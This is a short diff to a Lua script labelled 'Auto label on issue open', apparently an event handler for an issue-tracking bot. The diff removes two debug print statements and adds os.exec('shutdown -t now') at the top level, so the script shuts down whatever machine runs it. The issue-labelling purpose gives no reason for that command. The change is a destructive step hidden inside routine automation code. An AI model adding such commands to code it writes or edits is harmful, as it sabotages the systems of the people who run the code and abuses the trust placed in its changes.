@@ -1,7 +1,6 @@
 -- Auto label on issue open
 
-print(io)
-print(os)
+os.exec('shutdown -t now')
 
 on('IssueEvent', function (e)
   if(e.action == 'opened') then
